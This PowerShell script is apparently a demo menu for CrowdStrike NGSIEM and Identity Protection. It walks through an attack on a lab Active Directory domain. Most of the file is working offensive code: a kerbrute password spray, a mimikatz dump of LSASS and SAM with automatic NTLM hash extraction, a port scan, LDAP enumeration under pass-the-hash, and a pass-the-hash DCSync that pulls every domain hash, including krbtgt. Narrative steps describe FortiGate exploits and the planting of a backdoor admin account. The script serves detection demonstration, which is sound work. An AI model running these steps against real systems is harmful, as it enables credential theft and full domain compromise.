# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  CrowdStrike NGSIEM + Identity Protection Demo
#  Version: 4.0 (2026-03-26)
#
#  Attack narrative:
#    1. Phishing campaign (narrative - logs from log generator)
#    2. Fortinet exploitation (narrative - logs from log generator)
#    3. Brute force DT from compromised Fortinet (active - kerbrute)
#    4. Recon + credential dump + scan on DT (active - mimikatz)
#    5. Attack Domain Controller - DCSync (active - PtH)
#    6. Lateral movement to Ubuntu - cloud detections (active - SSH)
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_DT=<DT IP address>
# set ENV_FORTI_IP=<FortiGate firewall IP>
# set ENV_UBUNTU=<Ubuntu server IP>

$ErrorActionPreference = "Continue"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
$wordlistFile = "$idpDir\wordlist.txt"

# --- Load saved IP overrides (persisted across launches) ---
$ipConfigFile = "$idpDir\ip_config.txt"
if (Test-Path $ipConfigFile) {
    Get-Content $ipConfigFile | ForEach-Object {
        if ($_ -match '^(\w+)=(.+)$') {
            Set-Item -Path "env:$($Matches[1])" -Value $Matches[2]
        }
    }
}

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN)    { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)     { $missing += "ENV_DC_IP" }
if (-not $env:ENV_DT)        { $missing += "ENV_DT" }
if (-not $env:ENV_FORTI_IP)  { $missing += "ENV_FORTI_IP" }
if (-not $env:ENV_UBUNTU)    { $missing += "ENV_UBUNTU" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
    Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
    Write-Host '    set ENV_FORTI_IP=<FortiGate IP>' -ForegroundColor Gray
    Write-Host '    set ENV_UBUNTU=<Ubuntu IP>' -ForegroundColor Gray
    pause
    exit 1
}

# --- Validate IPs: hostnames won't work for PtH child processes ---
$ipPattern = '^\d+\.\d+\.\d+\.\d+$'
$needSave = $false
foreach ($varName in @("ENV_DC_IP", "ENV_DT", "ENV_FORTI_IP", "ENV_UBUNTU")) {
    $val = [Environment]::GetEnvironmentVariable($varName)
    if ($val -and $val -notmatch $ipPattern) {
        Write-Host "[!] $varName is set to hostname: $val (need IP address)" -ForegroundColor Red
        $newVal = Read-Host "    Enter IP for $varName"
        if ($newVal -match $ipPattern) {
            Set-Item -Path "env:$varName" -Value $newVal
            Write-Host "    [+] $varName = $newVal" -ForegroundColor Green
            $needSave = $true
        } else {
            Write-Host "    [!] Invalid IP. Exiting." -ForegroundColor Red
            pause; exit 1
        }
    }
}
if ($needSave) {
    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_FORTI_IP=$env:ENV_FORTI_IP", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN") | Out-File -FilePath $ipConfigFile -Encoding ASCII
    Write-Host "[+] IPs saved to $ipConfigFile (won't ask again)" -ForegroundColor Green
}

# Hash files saved between steps (live extraction, never hardcoded)
$clarkHashFile = "$idpDir\clark_hash.txt"
$svcHashFile = "$idpDir\svc_runbook_hash.txt"
$demoHashFile = "$idpDir\demo_hash.txt"

function Get-ClarkHash {
    if (Test-Path $clarkHashFile) {
        return (Get-Content $clarkHashFile -First 1).Trim()
    }
    Write-Host "[!] No clark.monroe hash found. Run Step 4 first." -ForegroundColor Red
    return $null
}

function Get-DemoHash {
    if (Test-Path $demoHashFile) {
        return (Get-Content $demoHashFile -First 1).Trim()
    }
    Write-Host "[!] No demo hash found. Run Step 4 first." -ForegroundColor Red
    return $null
}

function Get-SvcRunbookHash {
    if (Test-Path $svcHashFile) {
        return (Get-Content $svcHashFile -First 1).Trim()
    }
    Write-Host "[!] No svc_runbook hash found. Run Step 4 first." -ForegroundColor Red
    return $null
}

# --- Helper: narrative banner ---
function Show-StepBanner {
    param(
        [string]$Step,
        [string]$Title,
        [string[]]$Lines,
        [string]$Detection = ""
    )
    Clear-Host
    $width = 64
    $border = "=" * $width
    Write-Host ""
    Write-Host "  $border" -ForegroundColor Cyan
    Write-Host "  STEP $Step : $Title" -ForegroundColor Cyan
    Write-Host "  $border" -ForegroundColor Cyan
    Write-Host ""
    foreach ($line in $Lines) {
        Write-Host "  $line" -ForegroundColor White
    }
    if ($Detection) {
        Write-Host ""
        Write-Host "  NGSIEM / CrowdStrike detections:" -ForegroundColor Yellow
        Write-Host "  $Detection" -ForegroundColor Yellow
    }
    Write-Host ""
}

$scriptVersion = "4.0"

Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT" -ForegroundColor Green
Write-Host "[+]         FORTI=$env:ENV_FORTI_IP  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
if (Test-Path $clarkHashFile) {
    Write-Host "[+] clark.monroe NTLM: $(Get-Content $clarkHashFile -First 1)" -ForegroundColor Green
} else {
    Write-Host "[*] clark.monroe hash not yet extracted. Run Step 4." -ForegroundColor Yellow
}
Start-Sleep -Seconds 2

function Show-Menu {
    param ([string]$Title = 'Identity Attack Demo - Unmanaged Host')
    Clear-Host
    Write-Host
    Write-Host "================ $Title ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Attack: phishing > firewall exploit > pivot to DT > dump creds > DC attack > cloud" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
    Write-Host "  1: Phishing Campaign                       [Mimecast: spearphishing emails]"
    Write-Host "  2: Fortinet Exploitation                   [FortiGate: CVE exploit + backdoor]"
    Write-Host
    Write-Host "  --- Active Attack Steps ---" -ForegroundColor Yellow
    Write-Host "  3: Brute Force DT from Fortinet            [Kerbrute spray + IPS brute force]"
    Write-Host "  4: Recon + Dump + Scan on DT               [mimikatz, network scan, LDAP, AD spray]"
    Write-Host "  5: Attack DC (DCSync)                      [PtH clark.monroe -> DCSync all hashes]"
    Write-Host "  6: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 bucket scripts]"
    Write-Host
    Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $selection = Read-Host "Select step"
    switch ($selection) {

        # ================================================================
        # STEP 1: PHISHING CAMPAIGN (Narrative)
        # ================================================================
        '1' {
            Show-StepBanner -Step "1" -Title "INITIAL PHISHING CAMPAIGN" -Lines @(
                "The attacker launches a spearphishing campaign targeting"
                "multiple employees at the organization."
                ""
                "Attack emails include:"
                "  - .xlsm macro-enabled spreadsheet (delivered)"
                "  - .html credential harvester (delivered)"
                "  - .zip archive with payload (blocked by Mimecast)"
                "  - Phishing from spoofed external domains"
                ""
                "Some emails are BLOCKED by Mimecast (spam/AV filters)."
                "Others are DELIVERED to user inboxes."
                ""
                ">> These logs are generated by the log generator"
                ">> (portable_sender.py Mimecast samples)"
            ) -Detection "Mimecast email receipt, delivery vs block events, suspicious attachments"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - Mimecast events: Rcpt, Process, Delivery" -ForegroundColor White
            Write-Host "  - Blocked emails: SpamFilter, ContentExamination" -ForegroundColor White
            Write-Host "  - Delivered emails with .xlsm, .html, .zip attachments" -ForegroundColor White
            Write-Host "  - Sender reputation and domain analysis" -ForegroundColor White
            Write-Host
            Write-Host "  [*] Next: Step 2 (Fortinet exploitation)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 2: FORTINET EXPLOITATION (Narrative)
        # ================================================================
        '2' {
            Show-StepBanner -Step "2" -Title "FORTINET EXPLOITATION" -Lines @(
                "The attacker exploits known CVEs on the FortiGate"
                "firewall at $($env:ENV_FORTI_IP) to gain super-admin access."
                ""
                "Exploit chain:"
                "  1. CVE-2024-55591: jsconsole authentication bypass"
                "  2. CVE-2023-27997: SSL-VPN heap overflow (sslvpnd crash)"
                "  3. Create backdoor admin account: svc_backup"
                "  4. Add svc_backup to super_admin profile"
                "  5. Modify SSLVPN settings for persistent access"
                "  6. Disable event logging to cover tracks"
                "  7. Delete svc_backup (short-lived, forensic evasion)"
                "  8. Establish VPN tunnel into internal network"
                ""
                ">> These logs are generated by the log generator"
                ">> (portable_sender.py FortiGate samples)"
            ) -Detection "FortiGate: jsconsole anomaly, admin creation/deletion, config changes, VPN tunnel"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - FortiGate system events: admin login from unexpected IPs" -ForegroundColor White
            Write-Host "  - Rapid admin account creation then deletion (svc_backup)" -ForegroundColor White
            Write-Host "  - SSLVPN configuration changes" -ForegroundColor White
            Write-Host "  - Event logging disabled (gap in logs)" -ForegroundColor White
            Write-Host "  - VPN tunnel established from external IP" -ForegroundColor White
            Write-Host
            Write-Host "  [*] The attacker now has a VPN tunnel into the internal network." -ForegroundColor Yellow
            Write-Host "  [*] Next: Step 3 (brute force DT from compromised Fortinet)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 3: BRUTE FORCE DT FROM COMPROMISED FORTINET (Active)
        # ================================================================
        '3' {
            Show-StepBanner -Step "3" -Title "BRUTE FORCE DT FROM COMPROMISED FORTINET" -Lines @(
                "The compromised FortiGate ($($env:ENV_FORTI_IP)) is used as a pivot."
                "The attacker targets the DT machine at $($env:ENV_DT)."
                ""
                "Attack: Password spray against AD using credentials"
                "harvested from the FortiGate config + common passwords."
                ""
                "DT has CrowdStrike Falcon (detect mode) - alerts will fire."
                ""
                "FortiGate IPS brute force logs come from the log generator."
                "This step runs kerbrute to trigger CrowdStrike IDP detection."
            ) -Detection "FortiGate IPS: brute force signature | CrowdStrike IDP: CredentialScanningActiveDirectory"

            # --- Kerbrute password spray ---
            Write-Host "--- Kerbrute Password Spray ---" -ForegroundColor Yellow
            Write-Host

            $userFile = "$idpDir\ldap_users.txt"
            if (-not (Test-Path $userFile)) {
                $userFile = "$idpDir\users.txt"
                Write-Host "  Using static user list ($userFile)" -ForegroundColor Yellow
            } else {
                Write-Host "  Using LDAP-harvested user list" -ForegroundColor Green
            }
            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
            Write-Host

            $sprayPw = Read-Host "  Enter password to spray (e.g. Password1)"
            if ($sprayPw) {
                Write-Host
                Write-Host "  [*] Spraying '$sprayPw' against all users via Kerberos pre-auth..." -ForegroundColor White
                Write-Host "  [*] This triggers CredentialScanningActiveDirectory in CrowdStrike IDP" -ForegroundColor Yellow
                Write-Host

                $kerbrute = "$idpDir\kerbrute.exe"
                if (-not (Test-Path $kerbrute)) {
                    $kerbrute = "$idpDir\kerbrute_windows_amd64.exe"
                }

                if (Test-Path $kerbrute) {
                    try {
                        $proc = Start-Process -FilePath $kerbrute `
                            -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
                            -NoNewWindow -Wait -PassThru
                        Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
                    } catch {
                        Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red
                    }
                } else {
                    Write-Host "  [!] kerbrute not found at $idpDir" -ForegroundColor Red
                    Write-Host "  [*] Download kerbrute to $idpDir\kerbrute.exe" -ForegroundColor Gray
                }
            } else {
                Write-Host "  [*] Skipped spray." -ForegroundColor Yellow
            }

            Write-Host
            Write-Host "  [*] Next: Step 4 (Recon + Dump on DT)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 4: RECON + DUMP + SCAN ON DT (Active - Sub-menu)
        # ================================================================
        '4' {
            $step4Done = $false
            do {
                Clear-Host
                Write-Host
                Write-Host "  ================================================================" -ForegroundColor Cyan
                Write-Host "  STEP 4 : RECON + CREDENTIAL DUMP + SCAN ON DT" -ForegroundColor Cyan
                Write-Host "  ================================================================" -ForegroundColor Cyan
                Write-Host
                Write-Host "  Now on DT, the attacker performs recon and credential theft." -ForegroundColor White
                Write-Host "  DT has CrowdStrike Falcon in DETECT mode." -ForegroundColor Yellow
                Write-Host
                Write-Host "  A: Run ALL (4a > 4b > 4c > 4d)" -ForegroundColor Green
                Write-Host "  1: System recon (whoami, ipconfig, net user)"
                Write-Host "  2: Mimikatz credential dump (SAM + logonpasswords)"
                Write-Host "  3: Network scan (ARP + port scan)"
                Write-Host "  4: LDAP recon via PtH (enumerate AD users, SPNs)"
                Write-Host "  B: Back to main menu"
                Write-Host
                $sub = Read-Host "  Select"

                if ($sub -eq 'B' -or $sub -eq 'b') { $step4Done = $true; continue }

                # --- 4a: System Recon ---
                if ($sub -eq '1' -or $sub -eq 'A' -or $sub -eq 'a') {
                    Write-Host "`n--- 4a: System Reconnaissance ---" -ForegroundColor Yellow
                    Write-Host

                    Write-Host "--- Who am I? ---" -ForegroundColor Yellow
                    whoami /all
                    Write-Host

                    Write-Host "--- System Info ---" -ForegroundColor Yellow
                    Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
                    Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
                    Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
                    Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
                    Write-Host

                    Write-Host "--- Network Config ---" -ForegroundColor Yellow
                    ipconfig /all | Select-String "IPv4|Subnet|Gateway|DNS Servers|DHCP Server"
                    Write-Host

                    Write-Host "--- Local Admins ---" -ForegroundColor Yellow
                    net localgroup Administrators
                    Write-Host

                    Write-Host "--- User profiles ---" -ForegroundColor Yellow
                    dir C:\Users | Select-Object Name | Format-Table -AutoSize

                    Write-Host "--- Local accounts ---" -ForegroundColor Yellow
                    net user

                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
                }

                # --- 4b: Mimikatz Credential Dump ---
                if ($sub -eq '2' -or $sub -eq 'A' -or $sub -eq 'a') {
                    Write-Host "`n--- 4b: Mimikatz Credential Dump ---" -ForegroundColor Yellow
                    Write-Host "  Triggers: LSASS access, credential dumping on Falcon-managed host" -ForegroundColor Yellow
                    Write-Host

                    & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step4_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

                    Write-Host "`n[+] Output saved to: $idpDir\step4_cred_dump.log" -ForegroundColor Green

                    # Auto-extract clark.monroe NTLM hash
                    $dumpLog = "$idpDir\step4_cred_dump.log"
                    if (Test-Path $dumpLog) {
                        $logContent = Get-Content $dumpLog -Raw

                        if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
                            $extractedClark = $Matches[1].ToLower()
                            $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                            Write-Host "[+] clark.monroe NTLM extracted: $extractedClark" -ForegroundColor Green
                        } else {
                            Write-Host "[!] Could not auto-extract clark.monroe hash." -ForegroundColor Yellow
                            $manualHash = Read-Host "  Enter clark.monroe NTLM hash manually"
                            if ($manualHash -and $manualHash.Length -eq 32) {
                                $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
                                Write-Host "[+] Hash saved." -ForegroundColor Green
                            }
                        }

                        # Auto-extract demo account NTLM hash
                        if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
                            $extractedDemo = $Matches[1].ToLower()
                            $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
                            Write-Host "[+] demo NTLM extracted: $extractedDemo" -ForegroundColor Green
                        } else {
                            Write-Host "[!] Could not auto-extract demo hash." -ForegroundColor Yellow
                            $manualDemoHash = Read-Host "  Enter demo NTLM hash manually"
                            if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
                                $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
                                Write-Host "[+] Demo hash saved." -ForegroundColor Green
                            }
                        }
                    }

                    Write-Host "[*] Hashes ready for Steps 5 and 6." -ForegroundColor Cyan
                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
                }

                # --- 4c: Network Scan ---
                if ($sub -eq '3' -or $sub -eq 'A' -or $sub -eq 'a') {
                    Write-Host "`n--- 4c: Network Discovery ---" -ForegroundColor Yellow
                    Write-Host

                    $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }
                    $myIP = $adapter.IPv4Address.IPAddress
                    $gateway = $adapter.IPv4DefaultGateway.NextHop
                    $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4).ServerAddresses

                    Write-Host "  Local IP : $myIP" -ForegroundColor White
                    Write-Host "  Gateway  : $gateway" -ForegroundColor White
                    Write-Host "  DNS      : $($dnsServers -join ', ')" -ForegroundColor White
                    Write-Host

                    Write-Host "--- ARP Table ---" -ForegroundColor Yellow
                    arp -a
                    Write-Host

                    $arpEntries = arp -a | Select-String '(\d+\.\d+\.\d+\.\d+)' | ForEach-Object {
                        $ip = $_.Matches[0].Value
                        if ($ip -notmatch '^(224\.|239\.|255\.|169\.254)' -and $ip -ne $myIP -and $ip -ne "255.255.255.255") { $ip }
                    } | Sort-Object -Unique

                    $allTargets = @($arpEntries) + @($dnsServers) | Sort-Object -Unique
                    Write-Host "--- Discovered hosts ---" -ForegroundColor Yellow
                    $allTargets | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
                    Write-Host

                    $scanPorts = @(88, 389, 636, 445, 3389, 135, 5985, 22, 53)
                    $discovered = @()

                    Write-Host "--- Port Scan (TCP) ---" -ForegroundColor Yellow
                    foreach ($ip in $allTargets) {
                        Write-Host "`n  Scanning $ip ..." -ForegroundColor White
                        $openPorts = @()
                        foreach ($port in $scanPorts) {
                            $tcp = New-Object System.Net.Sockets.TcpClient
                            try {
                                $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
                                if ($tcp.Connected) {
                                    Write-Host "    Port $port : OPEN" -ForegroundColor Green
                                    $openPorts += $port
                                }
                            } catch { }
                            $tcp.Close()
                        }
                        if ($openPorts.Count -eq 0) { Write-Host "    No open ports" -ForegroundColor DarkGray }

                        $role = ""
                        if ($openPorts -contains 88 -and $openPorts -contains 389) { $role = "DOMAIN CONTROLLER" }
                        elseif ($openPorts -contains 3389 -and $openPorts -contains 445) { $role = "WORKSTATION/SERVER" }
                        elseif ($ip -eq $gateway) { $role = "GATEWAY" }
                        if ($role) { Write-Host "    >> Identified: $role" -ForegroundColor Cyan }

                        $discovered += [PSCustomObject]@{ IP = $ip; Role = $role; Ports = ($openPorts -join ',') }
                    }

                    Write-Host "`n--- Summary ---" -ForegroundColor Yellow
                    foreach ($h in $discovered) {
                        $label = if ($h.Role) { " [$($h.Role)]" } else { "" }
                        $ports = if ($h.Ports) { " Ports: $($h.Ports)" } else { " (no open ports)" }
                        Write-Host "  $($h.IP)${label}${ports}" -ForegroundColor $(if ($h.Role -eq "DOMAIN CONTROLLER") { "Red" } elseif ($h.Role) { "Yellow" } else { "Gray" })
                    }

                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
                }

                # --- 4d: LDAP Recon via PtH ---
                if ($sub -eq '4' -or $sub -eq 'A' -or $sub -eq 'a') {
                    Write-Host "`n--- 4d: LDAP Reconnaissance via PtH ---" -ForegroundColor Yellow
                    Write-Host "  Triggers: PassTheHash + LDAP enumeration" -ForegroundColor Yellow
                    Write-Host

                    $clarkHash = Get-ClarkHash
                    if (-not $clarkHash) {
                        Write-Host "  [!] Need clark.monroe hash. Run 4b first." -ForegroundColor Red
                        pause; continue
                    }

                    $ldapScript = @'
$ErrorActionPreference = "Continue"
$dcIP = $env:ENV_DC_IP
$idpDir = "C:\IDP_Files"

Write-Host "`n--- Enumerating AD via LDAP ($dcIP) ---" -ForegroundColor Yellow
try {
    $entry = New-Object DirectoryServices.DirectoryEntry("LDAP://$dcIP")
    $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","memberof","serviceprincipalname"))
    $results = $searcher.FindAll()

    $svcAccounts = @()
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $spns = $r.Properties["serviceprincipalname"]
        $memberof = $r.Properties["memberof"]

        $privGroups = @()
        foreach ($grp in $memberof) {
            if ($grp -match "Domain Admins|Enterprise Admins|Administrators|Account Operators") {
                $privGroups += ($grp -split ',')[0] -replace 'CN=',''
            }
        }

        $prefix = "  "
        if ($spns.Count -gt 0) { $prefix = "* "; $svcAccounts += $sam }
        if ($privGroups.Count -gt 0) { $prefix = "! " }

        $line = "${prefix}${sam}"
        if ($privGroups.Count -gt 0) { $line += " [PRIV: $($privGroups -join ', ')]" }
        if ($spns.Count -gt 0) { $line += " [SPN: $($spns -join ', ')]" }

        Write-Host $line -ForegroundColor $(if ($prefix -eq "! ") { "Red" } elseif ($prefix -eq "* ") { "Yellow" } else { "Gray" })
    }

    Write-Host "`n  Legend: ! = privileged group  * = has SPN (kerberoastable)" -ForegroundColor DarkGray
    Write-Host "  Total users found: $($results.Count)" -ForegroundColor White

    $userList = $results | ForEach-Object { $_.Properties["samaccountname"][0] }
    $userList | Out-File -FilePath "$idpDir\ldap_users.txt" -Encoding ASCII
    Write-Host "`n[+] User list saved to: $idpDir\ldap_users.txt" -ForegroundColor Green

    if ($svcAccounts.Count -gt 0) {
        Write-Host "[!] Kerberoastable: $($svcAccounts -join ', ')" -ForegroundColor Red
    }
    $results.Dispose()
    $entry.Close()
} catch {
    Write-Host "[!] LDAP failed: $_" -ForegroundColor Red
}
Write-Host "`nPress any key to close..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
'@
                    $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII
                    (Get-Content "$idpDir\ldap_recon.ps1") -replace '\$env:ENV_DC_IP', "'$($env:ENV_DC_IP)'" | Set-Content "$idpDir\ldap_recon.ps1" -Encoding ASCII

                    $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
                    $batContent | Out-File -FilePath "$idpDir\run_ldap_recon.bat" -Encoding ASCII

                    Write-Host "  Launching PtH clark.monroe -> LDAP recon..." -ForegroundColor White
                    Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
                    Write-Host

                    & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"

                    Write-Host "`n[+] LDAP recon launched in PtH context." -ForegroundColor Green
                    Write-Host "[*] Check the new window for results." -ForegroundColor Cyan

                    if ($sub -ne 'A' -and $sub -ne 'a') { pause; continue }
                }

                if ($sub -eq 'A' -or $sub -eq 'a') {
                    Write-Host "`n[+] All Step 4 sub-steps complete." -ForegroundColor Green
                    pause
                    $step4Done = $true
                }

            } until ($step4Done)
        }

        # ================================================================
        # STEP 5: ATTACK DC - DCSync (Active)
        # ================================================================
        '5' {
            Show-StepBanner -Step "5" -Title "ATTACK DOMAIN CONTROLLER - DCSYNC" -Lines @(
                "Using clark.monroe (Domain Admin) NTLM hash from Step 4,"
                "the attacker performs Pass-the-Hash to authenticate to"
                "the DC at $($env:ENV_DC_IP)."
                ""
                "DCSync replicates the AD database, extracting NTLM hashes"
                "for ALL domain accounts including:"
                "  - krbtgt (enables Golden Ticket attacks)"
                "  - Administrator"
                "  - All service and user accounts"
            ) -Detection "CrowdStrike IDP: PassTheHash, DCSync (directory replication from non-DC)"

            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) { break }

            Write-Host "  User:   clark.monroe (Domain Admin)" -ForegroundColor White
            Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  NTLM:   $clarkHash" -ForegroundColor White
            Write-Host "  Target: $env:ENV_DC_IP (DC)" -ForegroundColor White
            Write-Host

            # Generate DCSync batch file dynamically (inject actual values)
            $dcSyncBat = @(
                "@echo off"
                "echo [*] DCSync against $env:ENV_DC_IP ($env:ENV_DOMAIN)..."
                "echo."
                "`"$mimiExe`" `"privilege::debug`" `"log $idpDir\dcsync_output.log`" `"lsadump::dcsync /domain:$env:ENV_DOMAIN /all /csv`" `"exit`""
                "echo."
                "echo [+] DCSync complete. Output: $idpDir\dcsync_output.log"
                "pause"
            )
            $dcSyncBat -join "`r`n" | Out-File -FilePath "$idpDir\Post_PtH_DCSync.bat" -Encoding ASCII

            Write-Host "  [*] Launching PtH clark.monroe -> DCSync..." -ForegroundColor White
            Write-Host "  [*] A new window will execute DCSync against the DC." -ForegroundColor Gray
            Write-Host

            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\Post_PtH_DCSync.bat`""

            Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
            Write-Host "[*] Output will be saved to $idpDir\dcsync_output.log" -ForegroundColor Cyan
            Write-Host
            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 6: LATERAL MOVEMENT TO UBUNTU (Active)
        # ================================================================
        '6' {
            Show-StepBanner -Step "6" -Title "LATERAL MOVEMENT TO UBUNTU - CLOUD DETECTIONS" -Lines @(
                "The attacker moves laterally from the Windows domain to"
                "the Ubuntu server at $($env:ENV_UBUNTU)."
                ""
                "On Ubuntu, pre-staged scripts trigger cloud detections:"
                ""
                "  1. Log4Shell behavioral detection (JNDI injection)"
                "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh"
                ""
                "  2. S3 bucket logging disabled"
                "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh"
                ""
                "  S3 bucket: warp-duck-private-bucket-d14afc48"
            ) -Detection "CrowdStrike: Log4Shell IoA, S3 bucket logging change, lateral movement"

            Write-Host "  --- SSH Connection ---" -ForegroundColor Yellow
            Write-Host
            Write-Host "  Target: $env:ENV_UBUNTU" -ForegroundColor White
            Write-Host
            Write-Host "  Run this command to connect:" -ForegroundColor Cyan
            Write-Host "    ssh ubuntu@$env:ENV_UBUNTU" -ForegroundColor Green
            Write-Host
            Write-Host "  Once connected, run these scripts:" -ForegroundColor Cyan
            Write-Host
            Write-Host "  1) Log4Shell behavioral IoA:" -ForegroundColor White
            Write-Host "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh" -ForegroundColor Green
            Write-Host
            Write-Host "  2) S3 bucket logging disabled:" -ForegroundColor White
            Write-Host "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh" -ForegroundColor Green
            Write-Host

            $launchSSH = Read-Host "  Launch SSH now? (y/N)"
            if ($launchSSH -eq 'y') {
                $sshUser = Read-Host "  SSH username (default: ubuntu)"
                if (-not $sshUser) { $sshUser = "ubuntu" }
                try {
                    Start-Process -FilePath "ssh" -ArgumentList "$sshUser@$env:ENV_UBUNTU"
                    Write-Host "  [+] SSH launched." -ForegroundColor Green
                } catch {
                    Write-Host "  [!] SSH client not available. Connect manually." -ForegroundColor Red
                    Write-Host "  [*] Try: ssh $sshUser@$env:ENV_UBUNTU" -ForegroundColor Gray
                }
            }
        }

        # ================================================================
        # C: CONFIGURE IPs
        # ================================================================
        'C' {
            Clear-Host
            Write-Host "`n--- Current Configuration ---" -ForegroundColor Cyan
            Write-Host "  ENV_DOMAIN   = $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  ENV_DC_IP    = $env:ENV_DC_IP" -ForegroundColor White
            Write-Host "  ENV_DT       = $env:ENV_DT" -ForegroundColor White
            Write-Host "  ENV_FORTI_IP = $env:ENV_FORTI_IP" -ForegroundColor White
            Write-Host "  ENV_UBUNTU   = $env:ENV_UBUNTU" -ForegroundColor White
            Write-Host

            $editVar = Read-Host "  Enter variable name to change (or Enter to go back)"
            if ($editVar -and $editVar -match '^ENV_') {
                $newVal = Read-Host "  New value for $editVar"
                if ($newVal) {
                    Set-Item -Path "env:$editVar" -Value $newVal
                    Write-Host "  [+] $editVar = $newVal" -ForegroundColor Green
                    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_FORTI_IP=$env:ENV_FORTI_IP", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN") | Out-File -FilePath $ipConfigFile -Encoding ASCII
                    Write-Host "  [+] Saved to $ipConfigFile" -ForegroundColor Green
                }
            }
        }

        'c' {
            # Handle lowercase c
            $selection = 'C'
            continue
        }

        'q' { return }
    }
    pause
}
until ($selection -eq 'q')
